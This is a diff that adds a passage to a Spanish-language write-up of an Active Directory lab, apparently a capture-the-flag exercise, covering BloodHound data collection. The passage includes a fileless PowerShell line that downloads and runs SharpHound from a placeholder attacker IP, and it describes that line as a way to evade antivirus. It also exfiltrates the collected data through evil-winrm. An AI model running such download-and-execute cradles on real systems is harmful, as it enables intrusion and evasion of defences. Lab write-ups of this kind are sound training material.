@@ -296,3 +296,36 @@ Vemos que el usuario adam.scott tiene la contraseña `iloveyou1`, ya con las cre
 
 ![[Pasted image 20260416195247.png]]
 
+Ahora vamos a recolectar datos para BloodHound, y de esta forma encontrar vias de escalación, empezamos compartiendo el archivo SharpHound.ps1 con python:
+
+![[Pasted image 20260417080354.png]]
+
+Ahora vamos a llamar este archivo en windows usando IEX, de tal forma que estamos haciendo un ataque *FileLess* esto sirve especialmente para evadir al AV ya que no hay ningún archivo en disco que contenga malware, todo se carga inmediatamente en la memoria:
+
+```powershell
+IEX (New-Object Net.WebClient).downloadString('http://{IP_Atacante}/SharpHound.ps1')
+```
+
+Esto nos va a crear una función interna en la sesion llamada Invoke-BloodHound, esta nos ayudará a recolecatar la data que necesitamos:
+
+![[Pasted image 20260417080722.png]]
+
+vemos que nos genera un archivo .zip, nos lo descargamos con la función download de evil-winrm:
+
+![[Pasted image 20260417080916.png]]
+
+Ahora vamos a bloodhound y lo subimos.
+
+Analizando Bloodhound no encontramos nada de alto valor, por lo que hacemos una enumeración con BloodyAD:
+
+
+
+
+
+
+
+
+
+
+
+
